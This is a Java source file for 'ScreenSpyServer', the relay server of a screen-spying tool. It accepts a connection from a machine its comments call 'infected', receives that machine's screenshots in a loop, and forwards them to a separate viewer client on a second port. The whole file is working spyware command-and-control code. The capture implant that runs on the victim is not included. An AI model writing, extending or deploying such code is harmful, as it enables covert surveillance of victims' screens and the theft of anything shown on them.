import com.sun.corba.se.spi.activation.Server;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * Created by devasia on 4/23/15.
 */
public class ScreenSpyServer {

    private static long count = 0;
    private static BufferedImage im;
    private static int available = 0;
    private static OutputStream readerOs;

    public static void main(String args[]) {

        new Thread(new Runnable() {
            public void run() {
                handleInfectedMachine();
            }
        }).start();

        new Thread(new Runnable() {
            public void run() {
                handleReaderMachine();
            }
        }).start();
    }

    public static void handleInfectedMachine() {

        ServerSocket server = null;
        Socket s = null;

        try {

            server = new ServerSocket(8080);
            System.out.println("Started ServerSocket");
            s = server.accept(); // wait for infected machine to connect
            System.out.println("Accepted Infected Client");

            while (true) {

                BufferedImage temp = ImageIO.read(s.getInputStream());

                if (temp != null) {
                    im = temp;
                    //ImageIO.write(im, "png", new File("/home/devasia/Desktop/screenshots/screenshot" + count + ".png"));
                    System.out.println("Received Image");
                    count++;
                    available = 1;

                    if (readerOs != null) {
                        ImageIO.write(im, "png", readerOs);
                    }
                }
            }

        } catch (Exception e) {

            e.printStackTrace();
            try {
                if (s != null) {
                    s.close();
                }

                if (server != null) {
                    server.close();
                }
            } catch (Exception ex) {}

            handleInfectedMachine();
        }
    }

    public static void handleReaderMachine() {

        ServerSocket server = null;
        Socket s = null;

        try {
            server = new ServerSocket(8081);
            s = server.accept();
            readerOs = s.getOutputStream();
            System.out.println("Connected to ReaderClient");

            /*while (true) {
                if (available == 1 && im != null) {
                    ImageIO.write(im, "png", s.getOutputStream());
                    System.out.println("Sent Image to ReaderClient");
                    available = 0;
                }
            }*/

        } catch (Exception e) {
            System.err.println("EXCEPTION in handleReaderMachine; Restarting");
            e.printStackTrace();
            if (s != null) {
                try {
                    s.close();
                } catch (IOException ex) {}
            }

            if (server != null) {
                try {
                    server.close();
                } catch (IOException ex) {}
            }

            handleReaderMachine();
        }
    }
}
